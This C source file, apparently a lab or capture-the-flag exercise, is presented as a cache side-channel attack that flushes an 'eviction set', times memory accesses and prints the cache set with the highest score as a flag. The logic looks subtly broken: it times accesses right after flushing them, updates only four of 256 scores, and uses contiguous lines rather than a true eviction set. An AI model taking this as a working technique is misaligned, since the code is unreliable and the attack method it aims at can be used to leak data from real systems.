#include "util.h"

#define NUM_L2_CACHE_SETS 256
#define N 4
#define THRESHOLD 100

typedef unsigned long long CYCLES;
typedef unsigned char *ADDR_PTR;

int main(int argc, char const *argv[])
{
    int flag = -1;

    // Set up variables
    int scores[NUM_L2_CACHE_SETS] = {0};
    ADDR_PTR eviction_set[N];

    // Initialize eviction set addresses and populate the scores array
    for (int i = 0; i < N; i++) {
        eviction_set[i] = (ADDR_PTR)get_buffer() + i * CACHE_LINE_SIZE;
    }

    // Perform the cache side-channel attack
    for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
        // Flush the eviction set addresses from the cache
        for (int i = 0; i < N; i++) {
            clflush(eviction_set[i]);
        }

        // Access the eviction set addresses and measure the access time
        for (int i = 0; i < N; i++) {
            CYCLES time = measure_one_block_access_time(eviction_set[i]);

            // Update the scores array based on the access time
            if (time < THRESHOLD) {
                scores[i]++;
            }
        }
    }

    // Find the cache set index with the highest score
    int max_score = 0;
    for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
        if (scores[i] > max_score) {
            max_score = scores[i];
            flag = i;
        }
    }

    printf("Flag: %d\n", flag);
    return 0;
}